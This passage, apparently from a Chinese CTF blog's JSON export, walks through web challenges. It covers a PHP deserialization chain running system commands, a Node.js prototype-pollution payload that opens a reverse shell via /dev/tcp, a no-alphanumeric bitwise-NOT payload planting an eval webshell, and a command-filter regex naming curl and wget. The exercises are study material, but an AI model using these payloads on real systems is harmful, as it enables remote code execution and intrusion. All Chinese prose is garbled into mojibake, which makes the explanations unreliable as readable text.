   return \"ok,but wrong\";\n  }\n  public function __call($a, $b){\n    echo \"Hacker!\";\n  }\n}\n$a = unserialize($_GET['bbb']);\nthrow new Error(\"NoNoNo\");\n```\n\næ•´ä¸ªé“¾å­å…¶å®ä¸éš¾ å½“æ—¶åšè¿™é“é¢˜ç›® æœ¬åœ°popé“¾å·²ç»å†™å‡ºæ¥äº† ä½†æ˜¯å‘ç°æ²¡æ³•è§¦å‘ \n\n```php\n<?php\nclass TT{\n    public $key;\n    public $c;\n}\n\n\nclass JJ{\n    public $obj;\n}\nclass MM{\n    public $name;\n    public $c;\n\n\n}\n$a = new TT();\n$a->key = new JJ();\n$a->key->obj=new MM();\n$a->key->obj->name ='system';\n$a->key->obj->c='cat /flag';\necho serialize($a);\n?>\n#O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:9:\"cat /flag\";}}s:1:\"c\";N;}\n```\n\nç„¶åå°±ä¼šå‘ç°`throw new Error(\"NoNoNo\");`ä¼šæŒ¡åœ¨å‰é¢æ²¡æ³•ç»•è¿‡ï¼Œå½“æ—¶å°±å¯„äº†ã€‚\n\nè¿™é‡Œè€ƒåˆ°äº†fast destructçš„çŸ¥è¯†ç‚¹ å‡ºè‡ªï¼šhttps://zhuanlan.zhihu.com/p/405838002\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683425847710-d16be9c0-ad73-4d77-a90b-d1ddc07075b6.png)\n\nå…¶å®åŸç†è¿˜æ˜¯è›®å®¹æ˜“ç†è§£çš„ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶ï¼Œæœ€åå°±ä¼šè§¦å‘ææ„å‡½æ•°ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æå‰ç ´åè¿™ä¸ªåºåˆ—åŒ–åçš„ç»“æ„ï¼Œé‚£ä¹ˆå°±ä¼šæå‰è¿›å…¥ææ„å‡½æ•°\n\nè¿™é“é¢˜ç›®å°±æ˜¯å› ä¸º`throw new Error(\"NoNoNo\");`è€Œè¿›ä¸å»æˆ‘ä»¬æ„é€ çš„é“¾å­ ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç ´åæˆ‘ä»¬payloadé“¾å­ç»“æ„ é‚£ä¹ˆå°±ä¼šæå‰è¿›å…¥ææ„å‡½æ•° ä»è€Œè§¦å‘é“¾å­\n\npayloadï¼š`?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;}`\n\nè¿™æ ·æ˜¯å®Œæ•´é“¾å­æ²¡æ³•è§¦å‘çš„æˆ‘ä»¬å¯ä»¥åˆ é™¤æœ€åä¸€ä¸ª`}`ç ´åç»“æ„è®©ä»–æå‰è¿›å…¥ææ„å‡½æ•°\n\n```\n?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;\n```\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683426171520-63fa6be1-39b7-446d-8fc7-98f8d3e0a425.png)\n\n# å®Œç¾ç½‘ç«™\n\nä¸€é“å¾ˆè‡­çš„é¢˜ç›®ï¼Œå¤§æ¦‚é¢˜ç›®æ€è·¯æ˜¯ä»–ç»™äº†ä¸€ä¸ªimgå‚æ•°æ˜¯ä¸€ä¸ªå›¾ç‰‡æ ¼å¼base64ç¼–ç  ç„¶åè¿˜éœ€è¦æäº¤ä¸€ä¸ªnå‚æ•° ä½†æ˜¯næ˜¯ä¸€ä¸ª10-30çš„éšæœºæ•°å­— å¹¶ä¸”æ¯æ¬¡éƒ½ä¸ä¸€æ · é‚£ä¹ˆå…¶å®æ€è·¯å¾ˆç®€å•ç›´æ¥çˆ†ç ´å°±è¡Œäº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683427463745-906d989e-5129-4618-98ae-64fc1c6c5efb.jpeg)\n\nå¹¶ä¸”è¦åŒæ—¶æäº¤imgå’Œn ä½†æ˜¯è¿™æè¿°æˆ‘ä¹Ÿæ˜¯æ— è¯­\n\nç„¶åå½“æ—¶æ²¡å‘ç°flagæ–‡ä»¶åè—åœ¨ä»–ç»™çš„imgæœ«å°¾æ˜¯ffffpq.php  æ‰€ä»¥ä¸€ç›´åœ¨æ‰¾flag \n\næ€»ä¹‹åšçš„å¾ˆæ¶å¿ƒäºº åƒåƒäº†å±ä¸€æ ·yueäº†\n\n# notrce\n\nå¥½åƒæˆ‘æ²¡è®°é”™åº”è¯¥æ˜¯è¿™é“é¢˜ç›®\n\næºç å¦‚ä¸‹\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$c=$_POST['c'];\nif(!preg_match(\"/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|>|<|`|\\*|\\\\$|\\\\\\/i\",$c)){\n    exec($c);\n}else{\n    die(\"hacker\");\n}\n```\n\nè›®ç„å¹»çš„ä¸€é“é¢˜ç›® çœ‹äº†wpç›´æ¥ç”¨å°†æ ¹ç›®å½•flagå¤åˆ¶åˆ°å½“å‰ç›®å½•è®¿é—®å°±è¡Œ \n\nå‘¢å¦‚æœflagæ–‡ä»¶ç›®å½•ä¸æ˜¯å¸¸è§„å‘½å è¿™ä¸å°±å¯„äº†å—\n\nä¹‹åäº†è§£åˆ°æ˜¯éé¢„æœŸè§£ å“¦ é‚£æ²¡äº‹äº†:)\n\n# JUST_PROTO\n\nä¸€é“æˆ‘æœªè§¦åŠçš„é¢†åŸŸçš„é¢˜ç›® ä¸€é“nodejsçš„åŸå‹é“¾æ±¡æŸ“é¢˜ç›®\n\nè¿™ä¸¤å¤©æ¶è¡¥äº†ä¸€ä¸‹å…³äºåŸå‹é“¾æ±¡æŸ“çš„çŸ¥è¯†ç‚¹ï¼Œæ„Ÿå—é¢‡æ·±\n\nå¦‚æœä¹‹å‰äº†è§£è¿‡è¿™ä¸ª å…¶å®é¢˜ç›®ä¸€çœ¼ä¸çœŸå°±èƒ½çœ‹å‡ºæ˜¯åŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›® `__proto__`æ˜æ˜¾å°±æç¤ºäº†\n\nç»™å‡ºæºç ï¼š\n\n```javascript\nconst express = require('express');\nconst { exec } = require(\"child_process\");\nconst app = express();\napp.get('/', (req, res) => res.send('å—¨å—¨å—¨ï¼ï¼è€å…«æ¥äº†ï¼ï¼ï¼'));\n\nlet ba = {\n  baba: (token)=>{ return !!token },\n  bababa: ()=>{ if (JSON.stringify(date).length > 10000) date = {} }, \n  // set: `redis-cli -h ${ba.redis_host} set `\n  // get: `redis-cli -h ${ba.redis_host} get `\n};\n\nlet date = {};\n\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n\napp.get('/get', (req, res) => {\n  const {token, key} = req.query;\n  if (!ba.baba(token)) return res.send(\"wrong\");\n  let result = date[token];\n  if (result) result = result[key];\n  res.json({ result: result === undefined ? \"null\" : result, is_succ: result !== undefined })\n});\n\n\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n\napp.listen(8080, () => console.log(`å—¨å—¨å—¨ï¼ï¼è€å…«æ¥äº†ï¼ï¼ï¼`));\n\n\n//æ²¡æ•¢å§æ‰€æœ‰å˜é‡åæ¢æˆbababa æ€•è¢«æ‰“\n```\n\nå…ˆçœ‹/bkupè·¯ç”±\n\n```javascript\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n```\n\nå‘ç°äº†æˆ‘ä»¬æœ€å–œæ¬¢çš„exec()å‡½æ•°\n\n `const cmd = ba.redis_set + date ${date_stream.toString('base64')};` \n\nç„¶åè¿™éƒ¨åˆ†ba.redis_setå¦‚æœæˆ‘ä»¬å¯æ§åˆ™èƒ½è¾¾åˆ°rce\n\nå†æ¥çœ‹/setè·¯ç”±\n\n```javascript\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n```\n\né€šè¿‡getæ–¹å¼ç»™`token,key,var`ä¼ å‚\n\n`date[token][key] = val;`å› ä¸ºä¸‰ä¸ªå‚æ•°æˆ‘ä»¬éƒ½å¯æ§ï¼Œåˆ™å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“\n\nè¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šæ˜¯`data[token][key]`çš„å½¢å¼ï¼Œæˆ‘ä»¬ä¸€èˆ¬è®¤ä¸ºåº”è¯¥æ˜¯`data.token.key`çš„å½¢å¼\n\nå…¶å®è¿™ä¸¤ç§å½¢å¼æ˜¯ç›¸ç­‰çš„éƒ½å¯ä»¥\n\næ¯”å¦‚ctfshowæœ‰é¢˜ç›®çš„payloadï¼š\n\nåŸæœ¬æ˜¯ï¼š`?eval=require('child_process').execSync('ls')`\n\nå¦‚æœæ”¹ä¸º`?eval=require('child_process')['execSync']('ls')`é‚£ä¹ˆéƒ½æ˜¯å¯ä»¥çš„ï¼Œä¸¤ç§éƒ½æ˜¯ç­‰ä»·çš„\n\nå›åˆ°åŸé¢˜ï¼Œä½¿å¾—`token=__proto__,key=redis_set,var=shell`\n\nåˆ™ba.redis_seè¢«æ±¡æŸ“\n\n```\npayload:?token=__proto__&key=redis_set&var=bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\n```\n\nè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ç”¨ `bash -c` ç”±äºæˆ‘ä»¬æ˜¯åœ¨å¤–éƒ¨è¿è¡ŒshellæŒ‡ä»¤ï¼Œæ‰€ä»¥ä»–é»˜è®¤æ˜¯ä¸ä¼šè¯†åˆ«æˆ‘ä»¬çš„`bash -i`åå¼¹shellçš„ï¼Œ`bash -c`ä¿è¯äº†å‘½ä»¤ä½¿ç”¨`bash shell`å»æ‰§è¡Œ\n\nåå¼¹shelléƒ¨åˆ†ç”¨urlç¼–ç ä¸€ä¸‹\n\n`bash -c`å°±æ˜¯å°†åé¢å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤è¯»å…¥æ‰§è¡Œ ç„¶åè¾“å‡º  \n\n# itâ€™s time\n\nç»å…¸flaskçš„ssti\n\nç›´æ¥å½“ä¸ªè„šæœ¬å°å­ï¼Œå¤§è„šæœ¬æ³¨å…¥\n\næˆ–è€…å»æ‰¾ctfshow é¢˜ç›®çš„payloadéƒ½å¯ä»¥\n","tags":["Fast destruct","nodejs åŸå‹é“¾æ±¡æŸ“"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-68-[MRCTF2020]å¥—å¨ƒ","url":"/post/b79f6776.html","content":"\n[MRCTF2020]å¥—å¨ƒ\n\n<!--more-->\n\nè¿›å…¥é¢˜ç›® æŸ¥çœ‹æºç \n\n```cmake\n<!--\n//1st\n$query = $_SERVER['QUERY_STRING'];\n\n if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n    die('Y0u are So cutE!');\n}\n if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n    echo \"you are going to the next ~\";\n}\n!-->\n```\n\nåˆ†æï¼šè¾“å…¥çš„å­—ç¬¦ä¸²ä¸èƒ½æœ‰`_`å’Œå…¶urlç¼–ç ï¼Œå¹¶ä¸”getä¼ å‚b_u_p_tä¸èƒ½ç­‰äº23333 ä½†æ˜¯æ­£åˆ™åŒ¹é…éœ€è¦å¼€å¤´å’Œç»“å°¾ä¸º23333\n\nè¿™é‡Œç”¨åˆ°äº†phpåˆæ³•å˜é‡åçš„çŸ¥è¯†ç‚¹ï¼Œå¦‚æœåœ¨ä¼ å‚æ—¶ï¼Œé‡åˆ°ä¸åˆæ³•çš„å˜é‡åæ¯”å¦‚`.`åˆ™phpä¼šè‡ªåŠ¨å°†å…¶è½¬ä¸º`_`\n\næ­£åˆ™åŒ¹é…preg_match()é€šè¿‡æ¢è¡Œç¬¦`%0a`ç»•è¿‡å³å¯  åœ¨éå¤šè¡Œæ¨¡å¼ä¸‹ï¼Œ$ä¼¼ä¹ä¼šå¿½ç•¥åœ¨å¥å°¾çš„%0a\n\nå¯å‚è€ƒhttps://www.cnblogs.com/20175211lyz/p/12198258.html\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362389224-9f93cdc0-b997-45e9-8f7f-626ec36b4db3.png)\n\npayload:`?b.u.p.t=23333%2a`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362539907-88b3cf13-c278-4b0f-8f7a-fc105d89bf4f.png)\n\n```\n/secrettw.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362573491-a422447e-dedc-437c-bfed-400642d8c01f.png)\n\næŸ¥çœ‹æºç å‘ç°ä¸€æ®µjsfuckç¼–ç  ç›´æ¥åœ¨consoleä¸­è¾“å…¥å°±æœ‰å›æ˜¾äº†\n\nå…³äºjsfuckç å¯ä»¥å‚è€ƒï¼šhttps://www.jianshu.com/p/e7246218f424\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362663557-fba897df-6aac-40fd-8941-3b7a8243c607.png)\n\nè·å¾—æºç :\n\n```cmake\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\n\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \n\n\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?>\n```\n\nipç”¨ `Client-ip: 127.0.0.1`å†™åœ¨è¯·æ±‚å¤´ï¼Œå¹¶ä¸”åªèƒ½ç”¨è¿™ä¸ª\n\nåˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä¹Ÿä¸çŸ¥é“ Client-ip xff Real-ip è¿™ä¸‰ä¸ªåœ¨ä¸åŒé¢˜ç›®ä¸‹ä¸ºä»€ä¹ˆä¸èƒ½äº’ç”¨çš„åŸå›  æœ‰ç‚¹é˜´é—´\n\n2333ç”¨dataä¼ªåè®®å»ä¼ å‚\n\næˆ‘ä»¬è¦è¯»çš„æ–‡ä»¶fileä¼šç»è¿‡changeå‡½æ•°æ”¹å˜ æˆ‘ä»¬åªéœ€è¦å€’ç€å†™ä¸€ä¸ªchangeå‡½æ•° è®©å…¶è¿›è¿‡é¢˜ç›®å‡½æ•°æ—¶å€™å›åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹å³å¯ è„šæœ¬å¾ˆç®€å•\n\n```php\n<?php\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; }\n$str = 'ZmxhZy5waHA=';   //Zm5lbTZ6dH4=\necho change($str)\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362979416-9100efcf-0951-4540-9a1b-a57509c7d87f.png)\n","tags":["phpå­—ç¬¦ä¸²è§£æç‰¹æ€§"],"categories":["buuctf"]},{"title":"buuctf-66-[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME","url":"/post/7f59ce0.html","content":"\n[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME\n\n<!--more-->\n\n```cmake\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n\n\nè¿™é“é¢˜å°±æ˜¯é€šè¿‡å–åæ„é€ æ— æ•°å­—å­—æ¯rceçš„\n\nå…¶å®è¿™ç§æ„é€ å¥‡æ·«rceçš„ æ˜ç™½åŸç†ä¹‹å ç›´æ¥å½“ä¸ªè„šæœ¬å°å­åšèµ·é¢˜æ¥å˜å˜å¿«\n\nç”Ÿæˆè„šæœ¬å¦‚ä¸‹ï¼š\n\n```cmake\n<?php\n$ans1='assert';//å‡½æ•°å\n$ans2='eval($_POST[x])';//å‘½ä»¤\n$data1=('~'.urlencode(~$ans1));//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°system\n$data2=('~'.urlencode(~$ans2));//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°dir\necho ('('.$data1.')'.'('.$data2.')'.';');\n?>\n```\n\nç›´æ¥æ„é€ `system('ls')`å‘ç°ä¸å¯ä»¥\n\nå°±å¾ˆå¥‡æ€ª æ„é€ `phpinfo()`æ‰¾ä¸åˆ°æ€è·¯å°±å»çœ‹çœ‹é…ç½®æ–‡ä»¶ è¿™ä¸ªçœŸçš„å¾ˆé‡è¦\n\npayload:`?code=(~%8F%97%8F%96%91%99%90)();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683357622168-d10c216a-c463-4f40-847a-88eecc81c4a3.png)\n\nå‘ç°åŸæ¥æ˜¯å¥½å¤šå‡½æ•°è¢«ç¦äº† éš¾æ€ªæ‰§è¡Œä¸äº†\n\næ„é€ `assert(eval($_POST[x]))`ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ç”¨èšå‰‘å»è¿æ¥\n\næ³¨æ„è¿™ç§eval()ä¸­å†åµŒå¥—ä¸€ä¸ªassert(eval())çš„æ–¹å¼ æœ‰æ—¶å€™å¯ä»¥ç»•è¿‡waf\n\npayload: `?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%A2%D6);`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358006276-a208a639-bd8a-4241-baa8-a5d4b64e4dcd.png)\n\næ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æ€ä¹ˆç»•è¿‡disble_function å…·ä½“æ–¹å¼å¯ä»¥çœ‹æˆ‘è¿™ä¸€ç¯‡æ–‡ç«  è¿™é‡Œå°±ä¸èµ˜è¿°äº† https://z1d10t.github.io/post/db3afe26.html?highlight=disable\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358035645-929e3eb1-fe11-4d92-bed9-0bc5497f90d0.png)\n","tags":["RCEå¥‡æ·«æ–¹å¼"],"categories":["buuctf"]},{"title":"buuctf-64-[0CTF 2016]piapiapia","url":"/post/6e80c399.html","content":"\n[0CTF 2016]piapiapia\n\n<!--more-->\n\nä¸€é“phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸çš„é¢˜ç›®ï¼Œéœ€è¦ä»£ç å®¡è®¡ï¼Œtqlï¼\n\n## æ‹æ¸…æ€è·¯ï¼š\n\né¦–å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼Œå‘ç°æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ åœ°æ–¹ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯ä¼ æœ¨é©¬ï¼Œç„¶åå»è¿ï¼Œgetshellä½†åé¢å‘ç°æ–°å¤§é™†ï¼Œä¸€é¡¿æ“ä½œä¹‹åï¼Œå‘ç°éœ€è¦æ‰«ç½‘ç«™ï¼Œä¸‹è½½æºç ã€‚\n\nä¸‹è½½ä¸‹æ¥6ä¸ªphpæ–‡ä»¶ \n\nåœ¨config.phpä¸­å‘ç°æœ‰flag ä½†æ˜¯è¢«åˆ é™¤äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290000574-a5d69780-e1ec-48cc-a0f0-2351c7ced655.png)\n\nç„¶åregister.phpä¸index.phpéƒ½æ˜¯ä¸€äº›åŸºç¡€çš„æ³¨å†Œè´¦å·ä¸ç™»å½•è´¦å·çš„æ“ä½œ\n\nç„¶åç”±index.phpè½¬å‘update.php\n\nä¹Ÿå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„è¿™ä¸ªç•Œé¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290165259-d39fb665-8660-42cc-9811-c6644e2aa4e0.png)\n\n```cmake\n//update.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\tif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n\t\t$username = $_SESSION['username'];\n\t\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\t\tdie('Invalid phone');\n\n\t\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\t\tdie('Invalid email');\n\t\t\n\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n\n\t\t$file = $_FILES['photo'];\n\t\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\t\tdie('Photo size error');\n\n\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t\t$profile['phone'] = $_POST['phone'];\n\t\t$profile['email'] = $_POST['email'];\n\t\t$profile['nickname'] = $_POST['nickname'];\n\t\t$profile['photo'] = 'upload/' . md5($file['name']);\n  \t\t//useræ˜¯class.phpä¸­çš„userçš„ä¸€ä¸ªå¯¹è±¡\n\t\t$user->update_profile($username, serialize($profile)); //æˆ‘ä»¬çš„ç”¨æˆ·åadminå’Œprofileä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²å½¢å¼ä¼ è¿‡å»çš„\n\t\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n\t}\n\telse {\n?>\n```\n\nç®€å•çœ‹ä¸€ä¸‹å°±æ˜¯é€šè¿‡postè·å–å˜é‡å€¼ï¼Œå’Œä¸€äº›ç®€å•çš„åˆ¤æ–­è¾“å…¥æ˜¯å¦åˆæ³•çš„è¯­å¥ï¼Œæ³¨æ„ä¸€ä¸‹nickname(æ˜µç§°)çš„åˆ¤æ–­\n\n```cmake\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n```\n\nnicknameä¸èƒ½è¶…è¿‡10ä¸ªå­—ç¬¦ï¼Œä¹‹åä¼šæåŠ\n\nç„¶åä¼ å…¥update_profile() è¿™é‡Œ`$profile`æ•°ç»„æ˜¯æˆ‘ä»¬é€šè¿‡åºåˆ—åŒ–ä¼ å…¥çš„ï¼Œè¿™é‡Œå¾ˆé‡è¦\n\n```cmake\n$user->update_profile($username, serialize($profile)); //æˆ‘ä»¬çš„ç”¨æˆ·åadminå’Œprofileä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²å½¢å¼ä¼ è¿‡å»çš„\n```\n\nä¹‹åä¼ å…¥class.php\n\n```cmake\n//class.php\n<?php\nrequire('config.php');\n\nclass user extends mysql{   //ç»§æ‰¿ç±»çš„ç”Ÿæˆ mysqlä¸ºçˆ¶ç±» userä¸ºå­ç±»\n\tprivate $table = 'users';\n\n\tpublic function is_exists($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::select($this->table, $where);\n\t}\n\tpublic function register($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$key_list = Array('username', 'password');\n\t\t$value_list = Array($username, md5($password));\n\t\treturn parent::insert($this->table, $key_list, $value_list);\n\t}\n\tpublic function login($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\tif ($object && $object->password === md5($password)) {\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\n\t}\n\tpublic function show_profile($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\treturn $object->profile;\n\t}\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::update($this->table, 'profile', $new_profile, $where);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\n\nclass mysql {\n\tprivate $link = null;\n\n\tpublic function connect($config) {\n\t\t$this->link = mysql_connect(\n\t\t\t$config['hostname'],\n\t\t\t$config['username'], \n\t\t\t$config['password']\n\t\t);\n\t\tmysql_select_db($config['database']);\n\t\tmysql_query(\"SET sql_mode='strict_all_tables'\");\n\n\t\treturn $this->link;\n\t}\n\n\tpublic function select($table, $where, $ret = '*') {\n\t\t$sql = \"SELECT $ret FROM $table WHERE $where\";\n\t\t$result = mysql_query($sql, $this->link);\n\t\treturn mysql_fetch_object($result);\n\t}\n\n\tpublic function insert($table, $key_list, $value_list) {\n\t\t$key = implode(',', $key_list);\n\t\t$value = '\\'' . implode('\\',\\'', $value_list) . '\\''; \n\t\t$sql = \"INSERT INTO $table ($key) VALUES ($value)\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function update($table, $key, $value, $where) {\n\t\t$sql = \"UPDATE $table SET $key = '$value' WHERE $where\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function filter($string) {     //çˆ¶ç±»filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //ä¸€é¡¿æ“ä½œä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£åˆ™\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\nsession_start();\n$user = new user();\n$user->connect($config);\n```\n\nç›´æ¥å®šä½åˆ°update_profileå‡½æ•°\n\n```cmake\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n```\n\nè¿™é‡Œé€šè¿‡ç»§æ‰¿ç±»ï¼Œè°ƒç”¨çˆ¶ç±»çš„filterå‡½æ•°\n\n```cmake\npublic function filter($string) {     //çˆ¶ç±»filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //ä¸€é¡¿æ“ä½œä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£åˆ™\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n\nè¿™é‡Œç›¸å½“äºä¸€ä¸ªè¿‡æ»¤å™¨\n\né‡ç‚¹çœ‹ç¬¬äºŒä¸ªæ­£åˆ™ å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²æœ‰`'select', 'insert', 'update', 'delete', 'where'`åˆ™ä¼šè¢«æ›¿æ¢ä¸º`hacker`  è‡³æ­¤æš‚æ—¶ç»“æŸ\n\nå½“æˆ‘ä»¬ä¸Šä¼ å®Œupdate.phpéœ€è¦çš„ä¿¡æ¯ä¹‹åä¼šè·³å…¥profile.php\n\n```cmake\n//profile.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\t$username = $_SESSION['username'];\n\t$profile=$user->show_profile($username);\n\tif($profile  == null) {\n\t\theader('Location: update.php');\n\t}\n\telse {\n\t\t$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = 